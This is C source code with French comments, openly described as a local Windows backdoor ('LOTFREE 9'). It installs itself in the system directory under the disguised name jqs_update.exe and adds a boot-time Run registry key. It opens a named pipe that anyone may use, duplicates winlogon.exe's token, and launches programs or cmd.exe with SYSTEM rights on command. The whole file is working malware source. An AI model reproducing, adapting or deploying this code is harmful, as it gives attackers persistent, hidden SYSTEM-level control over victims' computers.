/* LOTFREE 9
 * Backdoor Windows locale
 * Donne les droits NT System via commande sur named pipe
 *
 * Le programme utilise TCHAR & co mais est fait pour unicode
 * cela dis le passage non-unicode ne necessite pas grandes modifications
 */
#define UNICODE
#define _UNICODE
#define _CRT_SECURE_NO_WARNINGS

// Fonctions acces registre, tokens etc
#pragma comment (lib, "advapi32")
// WTSQueryUserToken 
#pragma comment (lib, "Wtsapi32")
// CreateEnvironmentBlock
#pragma comment (lib, "Userenv")

#include <tchar.h>
#include <stdio.h>
#include <Windows.h>
// CreateToolhelp32Snapshot
#include <Tlhelp32.h>
#include <Wtsapi32.h>
#include <Userenv.h>
// ConvertStringSecurityDescriptorToSecurityDescriptorS
#include <Sddl.h>

#define BUFSIZE 512

DWORD WINAPI InstanceThread(LPVOID);

int _tmain(int argc, TCHAR *argv[])
{
    BOOL   fConnected = FALSE;
    DWORD  dwThreadId = 0;
    HANDLE hPipe = INVALID_HANDLE_VALUE, hThread = NULL;
    LPCTSTR lpszPipename = _T("\\\\.\\pipe\\mynamedpipe");
    LPTSTR lpDisplayBuf;
    TCHAR  orig_name[255];
    TCHAR  dest_name[255];
    HKEY key;
	PSECURITY_ATTRIBUTES pSa = NULL;

	SECURITY_ATTRIBUTES sa ={0};
	SECURITY_DESCRIPTOR sd={0};

	// Creer un security descriptor vide
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);

	// 3eme parametre : DACL NULL => permettre tous les acces
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.bInheritHandle = false;
	sa.lpSecurityDescriptor = &sd;
	sa.nLength = sizeof(sa);

    if (argc == 2)
    {
        // si argument = "install", place l'executable comme service lance au boot
        if(_tcscmp(_T("install"), argv[1]) == 0)
        {
			// Obtient le nom de l'exe en cours
            GetModuleFileName(NULL, orig_name, 255);
			// Obtenir l'emplacement des fichiers systemes
            GetSystemDirectory(dest_name, 255);
            _tcscat(dest_name, _T("\\jqs_update.exe"));
            _tprintf(_T("%s\n"), dest_name);
			// On y place une copie de l'excutable sous le nom jqs_update.exe
            CopyFile(orig_name, dest_name, FALSE);

			// Creation du cle Run dans le registre pour lancement au boot
            if(RegOpenKeyEx(HKEY_CURRENT_USER,
                   _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                   0,
                   KEY_SET_VALUE,
                   &key) == ERROR_SUCCESS)
            {
                if(RegSetValueEx(key,
					_T("jqs_update"),
					0,
					REG_SZ,
					(BYTE*)dest_name,
					11) != ERROR_SUCCESS)
					_tprintf(_T("Registry install failed"));
				RegCloseKey(key);
            }
            // On quitte : install terminee
            return 0;
        }
    }

	// Cas ou le programme est lance sans arguments
    for (;;)
    {
        // cree le tube nomme pour les communications avec des acces pour tout le monde
        _tprintf( _T("\nServer: Awaiting client connection on %s\n"), lpszPipename);
        hPipe = CreateNamedPipe(
                    lpszPipename,             // pipe name
                    PIPE_ACCESS_DUPLEX | WRITE_DAC,       // read/write access
                    PIPE_TYPE_MESSAGE |       // message type pipe
                    PIPE_READMODE_MESSAGE |   // message-read mode
                    PIPE_WAIT,                // blocking mode
                    PIPE_UNLIMITED_INSTANCES, // max. instances
                    BUFSIZE,                  // output buffer size
                    BUFSIZE,                  // input buffer size
                    0,                        // client time-out
                    &sa);                    // default security attribute - null avant

        if (hPipe == INVALID_HANDLE_VALUE)
        {
            // Ca a merde... affiche un message
            FormatMessage(
                FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL,
                GetLastError(),
                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                (LPTSTR)&lpDisplayBuf,
                0, NULL );
            _tprintf(_T("%s"), (LPSTR)lpDisplayBuf);
			// et quitte
            return -1;
        }

        // Attendre que des clients se connectent; en cas de reussite,
        // retourne une valeur non nulle. Dans le cas contraire
        // (retourne zero), GetLastError retourne ERROR_PIPE_CONNECTED.

        fConnected = ConnectNamedPipe(hPipe, NULL) ?
                     TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

        if (fConnected)
        {
            _tprintf(_T("Client connected, creating a processing thread.\n"));

            // Creation d'un thread pour gerer ce client
            hThread = CreateThread(
                NULL,              // no security attribute
                0,                 // default stack size
                InstanceThread,    // Thread qui gere la cnx avec le client :)
                (LPVOID) hPipe,    // thread parameter
                0,                 // not suspended
                &dwThreadId);      // returns thread ID

            if (hThread == NULL)
            {
				// Ca a merde... affiche l'erreur et quitte
                FormatMessage(
                    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL,
                    GetLastError(),
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                    (LPTSTR)&lpDisplayBuf,
                    0, NULL );
                return -1;
            }
            else CloseHandle(hThread);
        }
        else CloseHandle(hPipe); // The client could not connect, so close the pipe.
    } // end for
    LocalFree(lpDisplayBuf);
    return 0;
}

// Thread qui gere le client connecte
DWORD WINAPI InstanceThread(LPVOID lpvParam)
{
    HANDLE hHeap      = GetProcessHeap();
    TCHAR* pchRequest = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE*sizeof(TCHAR));
    TCHAR* pchReply   = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE*sizeof(TCHAR));

    DWORD cbBytesRead = 0, cbReplyBytes = 0, cbWritten = 0;
    BOOL fSuccess = FALSE;
    HANDLE hPipe  = NULL;
    LPTSTR arg1;
    LPTSTR arg2;
	TCHAR lpDisplayBuf[256];

// En mode debug, des messages d'erreur ou de reussite sont passes dans le journal des applications
#ifdef _DEBUG
	HANDLE hEventLog = NULL;
#endif

	LPTSTR lpszStrings[1];
	TCHAR cmdLine[256];
    
//pompage
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    BOOL bResult = FALSE;
    DWORD dwSessionId, winlogonPid;
    HANDLE hUserToken, hUserTokenDup, hPToken, hProcess;
    DWORD dwCreationFlags;

#ifdef _DEBUG
	hEventLog = RegisterEventSource(NULL, _T("LOTF"));
#endif

	// Récupère l'identifiant de la session physique en cours sur la machine
    dwSessionId = WTSGetActiveConsoleSessionId();

	// Récupère le PID de winlogon.exe
    PROCESSENTRY32 procEntry;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
    {
        return 1 ;
    }
    procEntry.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnap, &procEntry))
    {
        return 1;
    }
    do
    {
        if (_tcsicmp(procEntry.szExeFile, _T("winlogon.exe")) == 0)
        {
            // Processus winlogon trouvé...
            // make sure it's running in the console session
            DWORD winlogonSessId = 0;
            if (ProcessIdToSessionId(procEntry.th32ProcessID, &winlogonSessId) 
                    && winlogonSessId == dwSessionId)
            {
                winlogonPid = procEntry.th32ProcessID;
                break;
            }
        }
    } while (Process32Next(hSnap, &procEntry));

   // Récupère le token de la session physique en cours. Seul SYSTEM peut faire ça.
   WTSQueryUserToken(dwSessionId,&hUserToken);
   dwCreationFlags = NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE;
   ZeroMemory(&si, sizeof(STARTUPINFO));
   si.cb = sizeof(STARTUPINFO);
   si.lpDesktop = _T("winsta0\\default");
   ZeroMemory(&pi, sizeof(pi));
   TOKEN_PRIVILEGES tp;
   LUID luid;

   // Retourne un handle sur le process winlogon.exe
   hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, winlogonPid);

   if(hProcess == NULL)
   {
	   FormatMessage(
		   FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		   NULL,
		   GetLastError(),
		   MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		   (LPTSTR)&lpDisplayBuf,
		   0, NULL);
   }
   else
   {
	   	   _tcscpy(lpDisplayBuf, _T("OpenProcessToken : tout est ok!"));
   }
   lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 666, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif

   // Récupère le token d'accès de winlogon.exe avec les droits de duplication
   if(!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
                 |TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY| TOKEN_ADJUST_SESSIONID
                          |TOKEN_READ|TOKEN_WRITE, &hPToken))
   {
	   //_tprintf(_T("Process token open Error: %u\n"), GetLastError());
	   FormatMessage(
		   FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		   NULL,
		   GetLastError(),
		   MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		   (LPTSTR)&lpDisplayBuf,
		   0, NULL);
   }
   else
   {
	   _tcscpy(lpDisplayBuf, _T("OpenProcessToken : tout est ok!"));
   }
   lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 667, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif

   if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
   {
			   FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					GetLastError(),
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR)&lpDisplayBuf,
					0, NULL);
   }
   else
   {
	   _tcscpy(lpDisplayBuf, _T("LookupPrivilege: ok!"));
   }
   lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 668, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif

   tp.PrivilegeCount = 1;
   tp.Privileges[0].Luid = luid;
   tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

   // Duplication du token de winlogon.exe vers hUserTokenDup
   DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL,
            SecurityIdentification, TokenPrimary, &hUserTokenDup);

   // On associe le SID de la session physique au token dupliqué
   SetTokenInformation(hUserTokenDup,
        TokenSessionId,
		(void*)dwSessionId, // SID de la session physique
		sizeof(DWORD));

   if (!AdjustTokenPrivileges(hUserTokenDup,
	   FALSE,
	   &tp,
	   sizeof(TOKEN_PRIVILEGES),
	   (PTOKEN_PRIVILEGES)NULL,
	   NULL))
   {
	   	FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpDisplayBuf,
			0, NULL );
   }
   else
   {
	   _tcscpy(lpDisplayBuf, _T("AdjustTokenPrivileges: c'est ok!"));
   }
   lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 669, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif

   LPVOID pEnv = NULL;

   // Récupère l'environement du token dupliqué
   if(CreateEnvironmentBlock(&pEnv, hUserTokenDup, TRUE))
   {
       dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
	   _tcscpy(lpDisplayBuf, _T("CreateEnvironmentBlock: c'est ok!"));
   }
   else
   {
	   pEnv= NULL;
	   FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPTSTR)&lpDisplayBuf,
			0, NULL );
   }
   lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
   ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 670, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif
//paste end

    // Erreurs possible avec le thread. Si NOK on quitte
    if (lpvParam == NULL)
    {
        _tprintf(_T("\nERROR - Pipe Server Failure:\n"));
        _tprintf(_T("   InstanceThread got an unexpected NULL value in lpvParam.\n"));
        _tprintf(_T("   InstanceThread exitting.\n"));
        if (pchReply != NULL) HeapFree(hHeap, 0, pchReply);
        if (pchRequest != NULL) HeapFree(hHeap, 0, pchRequest);
        return (DWORD)-1;
    }

    // On recupere le handle de notre pipe
    hPipe = (HANDLE) lpvParam;

    // On envoi un message d'accueil a ce cher client qui a bien voulu se connecter
    _tcscpy(pchReply, _T("I'm here to serve you master."));
    cbReplyBytes = _tcsclen(pchReply) * sizeof(TCHAR);
    fSuccess = WriteFile(
                   hPipe,
                   pchReply,
                   cbReplyBytes,
                   &cbWritten,
                   NULL);

    // Loop until done reading
    while (1)
    {
		fSuccess = ReadFile(
                       hPipe,
                       pchRequest,
                       BUFSIZE * sizeof(TCHAR),
                       &cbBytesRead,
                       NULL);

        if (!fSuccess || cbBytesRead == 0)
        {
            if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                _tprintf(_T("InstanceThread: client disconnected.\n"));
            }
            else
            {
                _tprintf(_T("InstanceThread ReadFile failed, GLE=%lu.\n"), GetLastError());
            }
            break;
        }

		pchRequest[cbBytesRead / sizeof(TCHAR) - 1] = _T('\0');

        // Instruction CWD => change de repertoire courant
        if(_tcsnccmp(pchRequest, _T("CWD"), 3) == 0)
        {
            if(_tcsclen(pchRequest) > 3)
            {
				arg1 = _tcsspnp(&pchRequest[3], _T(" "));
				if(arg1 != NULL) SetCurrentDirectory(arg1); // pas de gestion d'erreur
            }
            GetCurrentDirectory(255, pchReply);
        }
        // Instruction RUN => execute un programme, permet de passer des arguments
        else if (_tcsnccmp(pchRequest, _T("RUN"), 3) == 0)
        {
            if(_tcsclen(pchRequest) > 3)
            {
				arg1 = _tcsspnp(&pchRequest[3], _T(" "));
				if(arg1 != NULL)
				{
					arg2 = _tcschr(arg1, _T('|'));
					if(arg2 != NULL)
					{
						_tprintf(_T("%s\n"), arg2);
						arg2[0] = _T('\0');
						arg2 = _tcsinc(arg2);
					}

					_sntprintf(cmdLine, BUFSIZE - 1, _T("\"%s\" %s"), arg1, arg2);

					bResult = CreateProcessAsUser(
						hUserTokenDup,   // client's access token
						arg1,            // fichier à executer
						cmdLine,         // ligne de commande (arguments)
						NULL,            // pointer to process SECURITY_ATTRIBUTES
						NULL,            // pointer to thread SECURITY_ATTRIBUTES
						FALSE,           // handles are not inheritable
						dwCreationFlags, // creation flags
						pEnv,            // pointer to new environment block
						NULL,            // name of current directory
						&si,             // pointer to STARTUPINFO structure
						&pi              // receives information about new process
					);
					if (bResult != NULL)
					{
						_tcscpy(pchReply, _T("CreateProcessAsUser Success!"));
					}
					else
					{
						_tcscpy(pchReply, _T("CreateProcessAsUser Error!"));
					}
				}
            }
			else
			{
				_tcscpy(pchReply, _T("Need arguments!"));
			}
        } // Fin RUN

        // Execute cmd.exe (invite de commande avec droits SYSTEM)
        else if (_tcsnccmp(pchRequest, _T("CMD"), 3) == 0)
        {
			_tcscpy(lpDisplayBuf, _T("Juste avant CreateProcessAsUser"));
			lpszStrings[0] = lpDisplayBuf;
#ifdef _DEBUG
			ReportEvent(hEventLog, EVENTLOG_INFORMATION_TYPE, 1, 671, NULL, 1, 0, (LPCTSTR*) &lpszStrings[0], NULL);
#endif

            // Launch the process in the client's logon session.

            bResult = CreateProcessAsUser(
                  hUserTokenDup,                     // client's access token
                  _T("C:\\windows\\system32\\cmd.exe"),
                  NULL,            // options
                  NULL,            // pointer to process SECURITY_ATTRIBUTES
                  NULL,            // pointer to thread SECURITY_ATTRIBUTES
                  FALSE,           // handles are not inheritable
                  dwCreationFlags, // creation flags
                  pEnv,            // pointer to new environment block
                  NULL,            // name of current directory
                  &si,             // pointer to STARTUPINFO structure
                  &pi              // receives information about new process
               );
            if (bResult != NULL)
            {
                _tcscpy(pchReply, _T("CreateProcessAsUser Success!"));
            }
            else
            {
                _tcscpy(pchReply, _T("CreateProcessAsUser Error!"));
            }
        }
		// Message pour les curieux
		else
		{
			_tcscpy(pchReply, _T("Protocol error #8486"));
		}
        cbReplyBytes = _tcsclen(pchReply) * sizeof(TCHAR);

        // Renvoi l'output sur le pipe
        fSuccess = WriteFile(
                       hPipe,        // handle to pipe
                       pchReply,     // buffer to write from
                       cbReplyBytes, // number of bytes to write
                       &cbWritten,   // number of bytes written
                       NULL);        // not overlapped I/O

        if (!fSuccess || cbReplyBytes != cbWritten)
        {
            _tprintf(_T("InstanceThread WriteFile failed, GLE=%lu.\n"), GetLastError());
            break;
        }
    } // Fin while

    // End impersonation of client
    CloseHandle(hProcess);
    CloseHandle(hUserToken);
    CloseHandle(hUserTokenDup);
    CloseHandle(hPToken);
  
    FlushFileBuffers(hPipe);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    HeapFree(hHeap, 0, pchRequest);
    HeapFree(hHeap, 0, pchReply);

#ifdef _DEBUG
	_tprintf(_T("InstanceThread exitting.\n"));
	DeregisterEventSource(hEventLog);
#endif
    return 1;
}
